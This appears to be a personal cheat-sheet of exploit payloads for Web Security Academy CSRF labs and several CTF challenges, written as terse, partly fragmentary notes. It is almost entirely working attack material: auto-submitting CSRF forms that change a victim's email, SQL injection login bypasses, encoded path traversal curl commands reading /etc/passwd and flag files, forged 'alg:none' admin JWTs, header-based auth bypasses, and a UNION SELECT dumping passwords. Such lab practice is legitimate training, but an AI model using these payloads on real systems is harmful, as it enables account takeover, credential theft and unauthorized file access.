# Bursuip-
CSRF vulnerability with no defenses

</html>
<form  action="https://0a8f00f5041fe6b281d52040007200e1.web-security-academy.net/my-account/change-email" method="post" id="csrf_attack">
    <input type="hidden" name="email" value="attacker@test.com">
</form>
<script>
        document.getElementById("csrf_attack").submit();
</script>
</html>

CSRF where token validation depends on request method

<script>
window.location.href = "https://0a4e00dc03e9b6e481eeee9800fa0067.web-security-academy.net/my-account/change-email?email=attacker@test.com"
</script>

Exploiting CSRF Vulnerabilities and CSRF where token validation depends on token being present


<form action="https://0a7300ae03ef28a182e0337f00a0009f.web-security-academy.net/my-account/change-email" method="post" id="csrf-attack">
    <input type="hidden" name="email" value="attack@attacker.com">
</form>
<script>
    document.getElementById("csrf-attack").submit();
</script>


CSRF with broken Referer validation

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Referer: https://your-exploit-server.net

<html>
    <head>
        <meta name="referrer" content="unsafe-url">
        <title>CSRF-12</title>
    </head>
    <body>
        <form action="https://0a5a001603618be6806a76fe00da0003.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="attacker@evil.com">
        </form>

        <script>
            history.pushState('', '', '/?0a5a001603618be6806a76fe00da0003.web-security-academy.net')
            document.forms[0].submit();
        </script>
    </body>
</html>
First one 
username : /*!50000*/x'||'1'='1
passwd : y'||'1'='1
/*!50000*/x'||'1'='1' | y'||'1'='1'

SELECT * FROM users WHERE username = '/*!50000*/x'||'1'='1' AND password = 'y'||'1'='1'


second one 
Open the target's Glass Vault page, open DevTools (F12) → Network tab, type a normal value like shard/test.txt into the Upload Reader field, submit it, and look at the request that fires. You need:

The host (e.g. http://team3.nncsc.local or similar)
The exact route/param (likely something like /challenges/glass-vault/read?path= — confirm the real one)
* # Variation B - triple encoding
curl -s -i "<HOST<ROUTE>shard/%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252fetc%25252fpasswd"

# Variation C - encoded slashes only, raw dots (tests if raw filter really blocks it)
curl -s -i "<HOST><ROUTE>shard/..%2f..%2f..%2fetc%2fpasswd"

#!/bin/bash

# Replace this with the real host/port for Glass Vault
TARGET="http://<target-host>"

# Replace this with the real route + param name from DevTools Network tab
# (e.g. it might be /download?path= or /files/download?file= etc.)
ROUTE="/download?path="
last one 
curl -s -i "<HOST><ROUTE>shard/%252e%252e%252fflag.txt"


third one 

Open the target's Quiet Header page, DevTools → Network tab, click whatever triggers the check (e.g. "Probe Edge" or similar), see the request. You need:
host , route being probed 
LANE=$(echo -n "quiet" | base64)
echo "LANE: $LANE"

STEP1=$(echo -n "edge" | base64)
BYPASS=$(echo -n "$STEP1" | base64)
echo "BYPASS: $BYPASS"

curl -s -i "<HOST><ROUTE>" \
  -H "x-quiet-lane: $LANE" \
  -H "x-mindshield-bypass: $BYPASS" \
  -H "x-quiet-probe: mirror"

  firth :
   Open the target's Amber Ledger page, open DevTools → Network tab, click "Present Token"
  The route (likely something like /challenges/amber-ledger/verify or an Authorization header check on a protected route)
  buit T:
  HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_')
PAYLOAD=$(echo -n '{"admin":true,"aud":"amber","iss":"mindshield.local","ctx":{"tier":7}}' | base64 | tr -d '=' | tr '+/' '-_')
echo "HEADER: $HEADER"
echo "PAYLOAD: $PAYLOAD"

TOKEN="${HEADER}.${PAYLOAD}."
echo "$TOKEN"

fire target : 
curl -s -i "<HOST><ROUTE>" -H "Authorization: Bearer $TOKEN"
curl -s -i "<HOST><ROUTE>" -d "token=$TOKEN"

 


sixth 
try :curl -i "http://<target-host>/api/orders/1?view=shadow&depth=2"
curl -i "http://<target-host>/api/orders/2?view=shadow&depth=2"

on fetc :2?view=shadow&depth=2

seventh: 
/challenges/cold-archive/files/backup.sql

nith
PATCH-OK-H21
 



 UNION SELECT NULL
 1 UNION SELECT username || '~' || password FROM users
